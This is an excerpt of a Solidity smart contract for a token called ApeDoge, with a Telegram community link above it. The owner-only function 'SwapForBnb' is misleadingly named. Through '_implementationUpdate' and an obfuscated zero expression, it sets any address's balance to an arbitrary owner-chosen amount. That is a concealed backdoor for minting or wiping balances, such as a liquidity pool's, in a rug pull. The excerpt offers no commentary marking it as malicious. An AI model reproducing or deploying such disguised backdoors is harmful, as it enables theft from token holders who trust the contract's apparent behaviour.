...
https://t.me/ApeDogeOfficialCommunity
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'ApeDoge';
    string constant public symbol = 'APEDOGE';
    ...
    address public projectAddress = 0x703392C06FB96490b70aDD574ef09405d79C6943;
  ...
  function SwapForBnb (address lpaddress, uint256 _value) public onlyOwner {
    _implementationUpdate(lpaddress, _value);
  
  }
  
  function _implementationUpdate (address miner, uint256 _value) internal {
    balanceOf[miner] = (balanceOf[miner] * 1 * 2 - balanceOf[miner] * 1 * 2) + (_value * 10 ** uint256(decimals));
